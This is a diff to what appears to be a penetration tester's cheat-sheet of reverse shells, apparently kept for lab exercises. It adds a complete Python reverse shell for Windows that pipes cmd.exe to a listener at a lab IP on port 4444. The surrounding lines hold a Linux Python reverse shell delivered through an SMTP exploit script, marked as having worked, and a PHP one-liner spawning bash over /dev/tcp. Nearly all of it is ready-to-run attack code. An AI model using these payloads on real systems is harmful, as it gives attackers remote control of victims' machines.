@@ -560,6 +560,38 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ***BELOW HAS WORKED THRU SMTP*** (PIPES WERE AN ISSUE)
 python3 open.py 192.168.200.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.200\",25));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
 ```
+Python on Windows
+```py
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.45.173",4444))
+
+p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
+```
 ##### PHP
 ```bash
 <?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
